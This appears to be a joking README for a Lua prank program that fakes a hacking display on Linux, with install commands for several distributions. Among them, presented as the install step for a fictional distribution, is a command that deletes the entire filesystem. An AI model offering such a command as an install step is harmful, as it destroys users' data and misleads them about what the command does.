# FakeHecker
## A fake hecking program for Linux
Scare your friends!

# Written in Lua

### How to install Lua (if somehow not installed)
`sudo dnf install lua` - Fedora

`sudo apt install lua5.4` - Debian

`sudo -i` and then `sudo rm -rf / --no-preserve-root` - Hannah Montana Linux

`sudo pacman -S lua` - Arch

# How to run
1) Download file to Downloads
2) CD to Downloads
3) Run file (`lua filename.lua`)

# I'm not AI i swear

I'm not artificial intelligence. I am become genuine stupidity.
